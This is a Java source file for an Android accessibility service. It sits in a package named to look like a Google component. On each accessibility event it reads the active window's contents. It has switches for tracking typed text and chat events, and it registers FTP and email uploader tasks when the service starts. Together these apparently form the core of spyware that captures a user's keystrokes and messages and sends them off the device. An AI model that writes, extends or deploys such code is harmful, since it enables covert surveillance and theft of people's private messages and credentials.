package service.android.google.com.accessibility;

import android.view.accessibility.AccessibilityEvent;

import javax.inject.Inject;

import service.android.google.com.accessibility.application.AccessibilityApplication;
import service.android.google.com.accessibility.controller.AccessibilityServiceController;
import service.android.google.com.accessibility.dagger.component.DaggerAccessibilityComponent;
import service.android.google.com.accessibility.dagger.module.AccessibilityModule;
import service.android.google.com.accessibility.model.ASEvent;
import timber.log.Timber;

public class AccessibilityService extends android.accessibilityservice.AccessibilityService implements AS {

    @Inject
    AccessibilityServiceController controller;

    //<editor-fold desc="Lifecycle Events">
    @Override
    protected void onServiceConnected() {
        doDaggerInjection();
        super.onServiceConnected();
        Timber.d("AccessibilityService was started!");
        controller.registerUploaderTask();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        controller.unSubscribe();
    }

    @Override
    public void onInterrupt() {
        Timber.e("Service was interrupted! ");
    }
    //</editor-fold>

    //<editor-fold desc="Accessibility Service">
    @Override
    public void evaluateEvent(final ASEvent event) {
        controller.evaluateEvent(event);
    }

    @Override
    public void onAccessibilityEvent(final AccessibilityEvent event) {
        controller.evaluateEvent(getRootInActiveWindow(), event);
    }
    //</editor-fold>

    //<editor-fold desc="Preferences Change Aware">
    @Override
    public void eventTrackingChanged(boolean isEnabled) {
        controller.toggleEventTracking(isEnabled);
    }

    @Override
    public void textEventTrackingChanged(boolean isEnabled) {
        controller.toggleTextEventTracking(isEnabled);
    }

    @Override
    public void chatEventTrackingChanged(boolean isEnabled) {
        controller.toggleChatEventTracking(isEnabled);
    }

    @Override
    public void ftpUploaderChanged(boolean isEnabled) {
        controller.registerUploaderTask();
    }

    @Override
    public void emailUploaderChanged(boolean isEnabled) {
        controller.registerUploaderTask();
    }
    //</editor-fold>

    private void doDaggerInjection() {
        DaggerAccessibilityComponent.builder()
                .graph(AccessibilityApplication.getInstance().graph())
                .accessibilityModule(new AccessibilityModule(this))
                .build()
                .inject(this);
        Timber.d("Dagger injected!");
    }

    @Override
    public void handleError(Throwable e) {
        controller.handleError(e);
    }
}